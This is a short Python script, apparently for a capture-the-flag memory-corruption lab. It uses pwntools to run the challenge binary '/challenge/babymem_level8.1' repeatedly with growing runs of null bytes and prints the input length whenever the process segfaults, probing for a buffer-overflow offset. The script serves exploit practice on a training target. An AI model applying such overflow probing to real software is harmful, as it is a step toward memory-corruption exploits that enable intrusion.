from pwn import *

file = "/challenge/babymem_level8.1"

for i in range(200):
    #p.sendline(bytes(str(i), 'ascii'))
    p = process(file)
    p.sendline(bytes(str(i), 'ascii'))
    p.sendline(b'\x00'*i)
    exitcode = p.poll(block=True)
    if exitcode == -11:
        print(i)
    p.close()


